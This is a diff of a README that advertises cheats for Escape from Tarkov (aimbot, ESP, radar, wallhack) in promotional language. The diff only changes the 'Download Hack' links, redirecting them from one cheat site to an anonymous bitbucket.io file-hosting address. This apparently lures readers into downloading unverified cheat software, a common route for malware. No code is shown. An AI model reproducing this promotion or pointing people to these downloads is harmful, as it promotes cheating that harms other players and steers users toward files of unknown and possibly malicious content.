@@ -2,7 +2,7 @@
 
 **Sick of being ambushed? Losing millions in gear raids? With a full-featured EFT hack, you flip the entire game: from tactical hardcore sim to a clean, calculated loot farm. Aimbots, ESP, radar, wallhacks — it's not survival anymore, it’s domination.**
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🎮 What Is an EFT Hack?
@@ -16,7 +16,7 @@ Perfect for:
 * Rage-mode rushers
 * Silent ESP lurkers
 
-[![Download Hack](https://i0.wp.com/game.video.tm/wp-content/uploads/sites/10/2021/05/1620410833_ESCAPE-FROM-TARKOV-HACKCHEAT-ESPAIMBOT-Undetected-2021.jpg)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Hack](https://i0.wp.com/game.video.tm/wp-content/uploads/sites/10/2021/05/1620410833_ESCAPE-FROM-TARKOV-HACKCHEAT-ESPAIMBOT-Undetected-2021.jpg)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🔥 Top EFT Hack Features
@@ -100,3 +100,4 @@ eft hack, escape from tarkov wallhack, eft aimbot cheat, tarkov radar hack, no r
 ---
 
 **No keys? No luck? No mercy.** EFT hacks give you the power to crush raids, rack millions, and play *your* way. Gear up, lock in, and own every raid. 🔫👁️💼
+
